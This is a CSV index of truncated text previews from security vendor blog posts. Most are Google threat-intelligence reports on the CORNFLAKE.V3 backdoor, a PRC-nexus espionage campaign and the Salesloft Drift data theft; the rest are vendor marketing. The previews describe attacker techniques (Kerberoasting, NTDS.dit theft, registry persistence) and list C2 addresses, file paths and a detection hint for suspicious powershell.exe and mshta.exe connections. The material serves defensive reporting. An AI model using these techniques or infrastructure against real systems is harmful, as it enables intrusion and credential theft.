chunk_id,page_sequence,title,company,token_count,has_images,text_preview
26334546-1_chunk_1,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,459,False,"Executive Summary
Broadcom's VMware vSphere product continues to be a top choice for private cloud virtualization, underpinning important systems and critical infrastructure. Far from losing its appea..."
26334546-1_chunk_2,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,606,False," about the risks, our next blog post contains  actionable guidance on how to defend your VMware vSphere estate . Additionally, register for our  upcoming webinar to learn these strategies directly fro..."
26334546-1_chunk_3,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,678,False," vSphere with AD creates a flexible environment that simplifies identity management, yet it introduces profound security risks. This direct link can turn an AD compromise into a significant threat aga..."
26334546-1_chunk_4,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,183,False, organizations focus their security efforts and EDR deployment inside the guest operating systems. This leaves the underlying ESXi hypervisor—the foundation of the entire virtualization environment—as...
26334546-1_chunk_5,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,348,False," window to mitigate risks; however, threat actors aren't just relying on unpatched vulnerabilities. They frequently leverage compromised credentials, a lack of MFA, and simple misconfigurations to gai..."
26334546-1_chunk_6,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,152,False," into a two-pronged approach: a tactical data exfiltration such as an AD database (NTDS.dit) and then the deployment of ransomware and mass encryption of all VMs.

Understanding the Active Directory I..."
26334546-1_chunk_7,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,918,False," security controls like multi-factor authentication (MFA), and the insecure default trust relationships it establishes. By examining these foundational mechanisms, we can expose the direct line from a..."
26334546-1_chunk_8,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,303,False," Identity Federation (ADFS, Azure AD, etc.)
**Granular Role-Based Access Control (RBAC)**
Limited (via host profile or CLI only)
Advanced RBAC with vCenter SSO

Why Not to Use Likewise-Based AD Integr..."
26334546-1_chunk_9,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,814,False," recommends leveraging identity federation with modern identity providers**, **bypassing the limitations of the legacy Likewise-based stack. Broadcom announced on March 25 that IWA will be removed in ..."
26334546-1_chunk_10,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,1230,False," reliance on a delegated logon based on AD password complexity, and any MFA would have to be at the network access layer or workstation login, not at the vCenter login prompt for those users.

The 'ES..."
26334546-1_chunk_11,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,855,False," to the forefront: the inherent dangers of joining vSphere ESXi hosts directly to an AD domain. While such integration offers perceived management convenience, it establishes a level of trust that can..."
26334546-1_chunk_12,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,939,False," as well, and that functionality continues to be supported. We recommend directing all configuration & usage through the Role-Based Access Controls (RBAC) present in vCenter Server, though.""
Source:  ..."
26334546-1_chunk_13,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,1663,False," expose the virtual infrastructure but also provide avenues to exploit the VCSA appliance's attack surface, such as its underlying Linux shell and the lack of comprehensive endpoint detection and resp..."
26334546-1_chunk_14,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,859,False," compromised elsewhere in the network cannot be leveraged to gain access to these Tier 0 systems. This design creates defense in depth security barriers, fundamentally reducing the likelihood and impa..."
26334546-1_chunk_15,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,154,False,"le their entire virtualized infrastructure, leading to operational disruption and financial loss. The time to adopt a resilient, defense-in-depth security posture to protect these critical vSphere env..."
26334546-2_chunk_1,2,Introducing Universal Logout for all Adaptive MFA customers,Okta,369,False,"Secure sessions, on your own terms. Okta is expanding the power of Universal Logout to more customers, providing better control over session management so that you can strengthen your organization’s s..."
26334546-2_chunk_2,2,Introducing Universal Logout for all Adaptive MFA customers,Okta,353,False,") 
 *Note: This means Super Admins can manually revoke access for three users per minute via the Okta Admin Console but can’t currently automate this process via API or Workflows integrations.

Why ch..."
26334546-3_chunk_1,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,86,False,"Welcome to the Frontline Bulletin Series
Straight from Mandiant Threat Defense, the ""Frontline Bulletin"" series brings you the latest on the most intriguing compromises we are seeing in the wild right..."
26334546-3_chunk_2,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,364,False," and respond to the most compelling threats we observe. This edition dissects an infection involving two threat groups, UNC5518 and UNC5774, leading to the deployment of CORNFLAKE.V3.

Introduction
Si..."
26334546-3_chunk_3,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,515,False,". Mandiant attributes the CORNFLAKE.V3 samples to UNC5774, a distinct financially motivated actor that uses UNC5518's access-as-a-service operation as an entry vector into target environments.

The CO..."
26334546-3_chunk_4,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,1294,False,"/gweb-cloudblog-publish/images/cornflake-fig1.max-2100x2100.jpg

Figure 1: The observed CORNFLAKE.V3 (Node.js) attack lifecycle

Initial Lead
Mandiant Threat Defense responded to suspicious PowerShell..."
26334546-3_chunk_5,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,484,False,"
• Credential harvesting attempts via Kerberoasting

Host and AD-based reconnaissance
Persistence via Registry Run key
Credential harvesting attempts via Kerberoasting
The following process tree was o..."
26334546-3_chunk_6,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,1025,False," to a random IP address in the `hostsIP` list instead. Once a connection is successfully established, the  main  function is called.
`mainloop``hosts``hostsIP``main`

C2 Communication
This function, n..."
26334546-3_chunk_7,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,538,False,"The `path2file` variable is then set as an argument to `node.exe` in the newly created `ChromeUpdater` registry key. This ensures that the malware executes upon user logon.

Executed Payloads
As obser..."
26334546-3_chunk_8,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,1379,False," these, it requests a Kerberos service ticket from which a password hash is extracted and formatted. These hashes are exfiltrated to the C2 server, where the attacker can attempt to crack them.

PHP V..."
26334546-3_chunk_9,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,457,False," transition from Node.js to PHP.
`JS``DLL``.png``ACTIVE``AUTORUN`These changes suggest an ongoing effort by the threat actor to refine their malware against evolving security measures.

A cmd.exe reco..."
26334546-3_chunk_10,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,243,False," `WINDYTWIST.SEA` samples attempting to move laterally in the network of the infected machine.
`WINDYTWIST`The following process tree was observed during the infection:

Conclusion
This investigation ..."
26334546-3_chunk_11,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,433,False," Brown, Mike Hunhoff, Genwei Jiang, Mon Liclican, Preston Lewis, Steve Sedotto, Elvis Miezitis and Rommel Joven for their valuable contributions to this blog post.

Detection Through Google Security O..."
26334546-3_chunk_12,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,1109,False," are located in %AppData%.
Search unusual network connections initiated by powershell.exe or mshta.exe to legitimate Node.js (nodejs.org) or PHP (windows.php.net) infrastructure domains.

Indicators o..."
26334546-3_chunk_13,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,78,False,"151`
`128.140.120[.]188`
`177.136.225[.]135`
WINDYTWIST.SEA backdoor C2 server addresses associated with UNC5774

Outbound Links:
https://security.googlecloudcommunity.com/community-blog-staging-priva..."
26334546-4_chunk_1,4,CrowdStrike Named a Leader in 2025 IDC MarketScape for Exposure Management,CrowdStrike,284,True,"CrowdStrike has been named a Leader in the 2025 IDC MarketScape: Worldwide Exposure Management 2025 Vendor Assessment.

CrowdStrike has redefined exposure management to meet the realities of today’s t..."
26334546-4_chunk_2,4,CrowdStrike Named a Leader in 2025 IDC MarketScape for Exposure Management,CrowdStrike,468,True," the 2025 IDC MarketScape for Exposure Management.
Extracted content: [IMAGE: CrowdStrike is positioned in the Leaders category in the 2025 IDC MarketScape for Exposure Management.]

A Leader in Expos..."
26334546-4_chunk_3,4,CrowdStrike Named a Leader in 2025 IDC MarketScape for Exposure Management,CrowdStrike,218,False," data and supporting proactive risk reduction.” We believe these strengths reinforce our position as the platform of choice for unifying exposure management, risk prioritization, and automated respons..."
26334546-4_chunk_4,4,CrowdStrike Named a Leader in 2025 IDC MarketScape for Exposure Management,CrowdStrike,228,False," console, and unified data model that powers the Falcon platform. All exposure management data is also sent to CrowdStrike Falcon® Next-Gen SIEM so asset information can be correlated to respond to th..."
26334546-5_chunk_1,5,What Is a Hybrid Mesh Firewall and Why It Matters,Palo Alto Networks,208,False,"Securing the Hybrid Network Landscape with a Hybrid Mesh Firewall Solution from Palo Alto Networks
In today’s distributed, cloud-first world, enterprises face unprecedented challenges securing their n..."
26334546-5_chunk_2,5,What Is a Hybrid Mesh Firewall and Why It Matters,Palo Alto Networks,366,False,", cloud-delivered management plane. It gives organizations the simplicity of consistency and visibility that they need to secure every part of their network, while reducing the cost and complexity of ..."
26334546-5_chunk_3,5,What Is a Hybrid Mesh Firewall and Why It Matters,Palo Alto Networks,328,False," Precision AI.
*The Strata Network Security Platform delivers the industry’s most comprehensive hybrid mesh firewall solution — unifying hardware, software and cloud form factors into a single, cloud-..."
26334546-5_chunk_4,5,What Is a Hybrid Mesh Firewall and Why It Matters,Palo Alto Networks,221,False," standards bodies, such as GSMA and ETSI, which is a strength highlighted by Gartner.
From manufacturing and utilities to government and defense, Palo Alto Networks protects hybrid networks at global ..."
26334546-6_chunk_1,6,Palo Alto Networks Named a Leader in WW Incident Response Services,Palo Alto Networks,171,False,"Palo Alto Networks has been named a Leader in the2025 IDC MarketScape for Worldwide Incident Response Services.
Global organizations face increasingly intense cyberattacks that cause millions, or even..."
26334546-6_chunk_2,6,Palo Alto Networks Named a Leader in WW Incident Response Services,Palo Alto Networks,280,False," organizations, more effectively.
To address these evolving threats, organizations need a strong, global incident response partner who can help them proactively prepare for, quickly respond to, and fu..."
26334546-6_chunk_3,6,Palo Alto Networks Named a Leader in WW Incident Response Services,Palo Alto Networks,175,False," IDC Research Vice President Craig Robinson:
""The firm's ability to contextualize incidents within the broader threat landscape adds significant value for clients seeking to understand not just what h..."
26334546-6_chunk_4,6,Palo Alto Networks Named a Leader in WW Incident Response Services,Palo Alto Networks,319,False,".”
Combining intelligence, technology and operational response, Unit 42 can shorten investigation time, reduce exposure, and improve outcomes, ultimately delivering efficiency gains across incident re..."
26334546-7_chunk_1,7,Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats,Google,273,False,"In March 2025, Google Threat Intelligence Group (GTIG) identified a complex, multifaceted campaign attributed to the PRC-nexus threat actor UNC6384. The campaign targeted diplomats in Southeast Asia a..."
26334546-7_chunk_2,7,Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats,Google,327,False," been added to the Google Safe Browsing list of unsafe web resources. Google Security Operations (SecOps) has also been updated with relevant intelligence, enabling defenders to hunt for this activity..."
26334546-7_chunk_3,7,Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats,Google,274,False," backdoor.
!https://storage.googleapis.com/gweb-cloudblog-publish/images/deception-in-depth-fig1.max-2100x2100.png

Figure 1: Attack chain diagram

Malware Delivery: Captive Portal Hijack
GTIG discove..."
26334546-7_chunk_4,7,Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats,Google,1028,False,"`!https://storage.googleapis.com/gweb-cloudblog-publish/images/deception-in-depth-fig2.max-1900x1900.png

Figure 2: Captive portal redirect chain

Fake Plugin Update
After being redirected, the threat..."
26334546-7_chunk_5,7,Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats,Google,2901,False," and ""`Cancel`” options. However, the SOGU.SEC payload is likely already running on the target device, as neither button triggers any action relevant to the malware.
`Install``Cancel`

Malware Analysi..."
26334546-7_chunk_6,7,Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats,Google,294,False,", SOGU.SEC was observed communicating directly with the C2 IP address “`166.88.2[.]90`” using HTTPS.
`166.88.2[.]90`

Attribution
GTIG attributes this campaign to UNC6384, a PRC-nexus cyber espionage ..."
26334546-7_chunk_7,7,Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats,Google,1220,False,"4 to protect users and customers. As part of this effort, Google continuously updates its protections and has taken specific action against this campaign.

Acknowledgment
A special thanks to Jon Danie..."
26334546-7_chunk_8,7,Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats,Google,296,False,"ui.exe"" 9 780
File Path
%LOCALAPPDATA%\DNVjzaXMFO\
C:\Users\Public\Intelnet\
C:\Users\Public\SecurityScan\

YARA Rules

Outbound Links:
https://support.google.com/a/answer/9007870?hl=en
https://safebr..."
26334546-8_chunk_1,8,Widespread Data Theft Targets Salesforce Instances via Salesloft Drift,Google,306,False,"Update (August 28)
Based on new information identified by GTIG, the scope of this compromise is not exclusive to the Salesforce integration with Salesloft Drift and impacts other integrations. We now ..."
26334546-8_chunk_2,8,Widespread Data Theft Targets Salesforce Instances via Salesloft Drift,Google,348,False," for those applications, and investigate all connected systems for signs of unauthorized access.
Salesloft has now engaged Mandiant to assist in their investigation. See Salesloft’s updated advisory f..."
26334546-8_chunk_3,8,Widespread Data Theft Targets Salesforce Instances via Salesloft Drift,Google,106,False," from the Salesforce AppExchange until further notice pending further investigation. This issue does not stem from a vulnerability within the core Salesforce platform.
GTIG, Salesforce, and Salesloft ..."
26334546-8_chunk_4,8,Widespread Data Theft Targets Salesforce Instances via Salesloft Drift,Google,1013,False,". For example, the threat actor ran the following sequence of queries to get a unique count from each of the associated Salesforce objects.
**Query to Retrieve User Data**
**Query to Retrieve Case Dat..."
26334546-8_chunk_5,8,Widespread Data Theft Targets Salesforce Instances via Salesloft Drift,Google,69,False," Permission: Remove the ""API Enabled"" permission from profiles and grant it only to authorized users via a Permission Set.
Additional instructions and updates are available on the Salesloft Trust Cent..."
26334546-8_chunk_6,8,Widespread Data Theft Targets Salesforce Instances via Salesloft Drift,Google,661,False," on the Salesloft Trust Center and Salesforce advisory.

Acknowledgments
We would like to thank Salesforce, Salesloft, and other trusted partners for their collaboration and assistance in responding t..."
26334546-8_chunk_7,8,Widespread Data Theft Targets Salesforce Instances via Salesloft Drift,Google,257,False,"
192.42.116.179
192.42.116.20
194.15.36.117
195.47.238.178
195.47.238.83

Outbound Links:
https://trust.salesloft.com/?uid=Drift%2FSalesforce+Security+Notification
https://www.salesloft.com/platform/d..."
26334546-9_chunk_1,9,CrowdStrike to Acquire Onum to Transform How Data Powers the Agentic SOC,CrowdStrike,243,False,"Today, I’m excited to announce CrowdStrike’s agreement to acquire Onum, a leader in real-time telemetry pipeline management that will extend the CrowdStrike Falcon® platform’s data advantage. Onum del..."
